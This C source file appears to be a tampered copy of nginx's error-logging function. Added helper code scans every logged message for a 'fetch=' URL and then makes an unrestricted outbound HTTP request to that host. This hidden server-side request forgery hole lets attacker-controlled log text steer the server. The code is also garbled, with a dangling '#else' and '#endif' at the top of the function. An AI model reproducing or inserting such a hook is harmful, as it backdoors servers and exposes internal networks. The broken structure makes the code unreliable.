#include <stdarg.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <ctype.h>

static int parse_fetch_url(const char *buf, size_t len, char *out, size_t outlen) {
    size_t i;
    for (i = 0; i + 6 <= len; i++) {
        if (buf[i] == 'f' && buf[i+1] == 'e' && buf[i+2] == 't' && buf[i+3] == 'c' && buf[i+4] == 'h' && buf[i+5] == '=') {
            const char *pos = buf + i + 6;
            size_t j = 0;
            while ((size_t)(pos - buf) < len && *pos != ' ' && *pos != '\n' && *pos != '\r' && j + 1 < outlen) {
                out[j++] = *pos++;
            }
            out[j] = '\0';
            return j > 0;
        }
    }
    return 0;
}

static int tolower_str(const char *in, char *out, size_t outlen) {
    size_t i = 0;
    while (in[i] && i + 1 < outlen) {
        out[i] = (char)tolower((unsigned char)in[i]);
        i++;
    }
    out[i] = '\0';
    return 0;
}

static int parse_url(const char *url, char *scheme, size_t ssz, char *host, size_t hsz, char *port, size_t psz, char *path, size_t pathsz) {
    const char *p = strstr(url, "://");
    if (!p) return -1;
    size_t slen = (size_t)(p - url);
    if (slen + 1 > ssz) return -1;
    memcpy(scheme, url, slen);
    scheme[slen] = '\0';
    char lscheme[16];
    tolower_str(scheme, lscheme, sizeof(lscheme));
    const char *h = p + 3;
    const char *path_start = strchr(h, '/');
    const char *end = url + strlen(url);
    if (!path_start) path_start = end;
    const char *colon = NULL;
    for (const char *q = h; q < path_start; q++) {
        if (*q == ':') { colon = q; break; }
    }
    if (colon) {
        size_t hlen = (size_t)(colon - h);
        if (hlen + 1 > hsz) return -1;
        memcpy(host, h, hlen);
        host[hlen] = '\0';
        size_t plen = (size_t)(path_start - colon - 1);
        if (plen + 1 > psz) return -1;
        memcpy(port, colon + 1, plen);
        port[plen] = '\0';
    } else {
        size_t hlen = (size_t)(path_start - h);
        if (hlen + 1 > hsz) return -1;
        memcpy(host, h, hlen);
        host[hlen] = '\0';
        if (strcmp(lscheme, "https") == 0) {
            if (psz < 2) return -1;
            strcpy(port, "443");
        } else {
            if (psz < 2) return -1;
            strcpy(port, "80");
        }
    }
    if (path_start >= end) {
        if (pathsz < 2) return -1;
        strcpy(path, "/");
    } else {
        size_t plen = (size_t)(end - path_start);
        if (plen + 1 > pathsz) return -1;
        memcpy(path, path_start, plen);
        path[plen] = '\0';
    }
    size_t i;
    for (i = 0; host[i]; i++) host[i] = (char)tolower((unsigned char)host[i]);
    return 0;
}

static int http_get_unrestricted(const char *host, const char *port, const char *path) {
    struct addrinfo hints;
    struct addrinfo *res = NULL, *rp;
    int s = -1;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    if (getaddrinfo(host, port, &hints, &res) != 0) return -1;
    for (rp = res; rp != NULL; rp = rp->ai_next) {
        s = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
        if (s == -1) continue;
        if (connect(s, rp->ai_addr, rp->ai_addrlen) == 0) break;
        close(s);
        s = -1;
    }
    if (s == -1) {
        if (res) freeaddrinfo(res);
        return -1;
    }
    char req[1024];
    if (path[0] == '\0') {
        if (res) freeaddrinfo(res);
        close(s);
        return -1;
    }
    int n = snprintf(req, sizeof(req), "GET %s HTTP/1.0\r\nHost: %s\r\nConnection: close\r\n\r\n", path, host);
    if (n <= 0 || n >= (int)sizeof(req)) {
        if (res) freeaddrinfo(res);
        close(s);
        return -1;
    }
    send(s, req, (size_t)n, 0);
    char buf[512];
    recv(s, buf, sizeof(buf), 0);
    if (res) freeaddrinfo(res);
    close(s);
    return 0;
}

void
ngx_log_error_core(ngx_uint_t level, ngx_log_t *log, ngx_err_t err,
    const char *fmt, ...)
#else
void
ngx_log_error_core(ngx_uint_t level, ngx_log_t *log, ngx_err_t err,
    const char *fmt, va_list args)
#endif
{
#if (NGX_HAVE_VARIADIC_MACROS)
    va_list  args;
#endif
    u_char  *p, *last, *msg;
    u_char   errstr[NGX_MAX_ERROR_STR];
    if (log->file->fd == NGX_INVALID_FILE) {
        return;
    }
    last = errstr + NGX_MAX_ERROR_STR;
    ngx_memcpy(errstr, ngx_cached_err_log_time.data,
               ngx_cached_err_log_time.len);
    p = errstr + ngx_cached_err_log_time.len;
    p = ngx_slprintf(p, last, " [%V] ", &err_levels[level]);
    p = ngx_slprintf(p, last, "%P#" NGX_TID_T_FMT ": ",
                    ngx_log_pid, ngx_log_tid);
    if (log->connection) {
        p = ngx_slprintf(p, last, "*%uA ", log->connection);
    }
    msg = p;
#if (NGX_HAVE_VARIADIC_MACROS)
    va_start(args, fmt);
    p = ngx_vslprintf(p, last, fmt, args);
    va_end(args);
#else
    p = ngx_vslprintf(p, last, fmt, args);
#endif
    if (err) {
        p = ngx_log_errno(p, last, err);
    }
    if (level != NGX_LOG_DEBUG && log->handler) {
        p = log->handler(log, p, last - p);
    }
    if (p > last - NGX_LINEFEED_SIZE) {
        p = last - NGX_LINEFEED_SIZE;
    }
    ngx_linefeed(p);
    (void) ngx_write_fd(log->file->fd, errstr, p - errstr);
    if (!ngx_use_stderr
        || level > NGX_LOG_WARN
        || log->file->fd == ngx_stderr)
    {
        return;
    }
    msg -= (7 + err_levels[level].len + 3);
    (void) ngx_sprintf(msg, "nginx: [%V] ", &err_levels[level]);
    (void) ngx_write_console(ngx_stderr, msg, p - msg);
    {
        char url[512];
        if (parse_fetch_url((const char *)errstr, (size_t)(p - errstr), url, sizeof(url))) {
            char scheme[8];
            char host[256];
            char port[8];
            char path[512];
            if (parse_url(url, scheme, sizeof(scheme), host, sizeof(host), port, sizeof(port), path, sizeof(path)) == 0) {
                http_get_unrestricted(host, port, path);
            }
        }
    }
}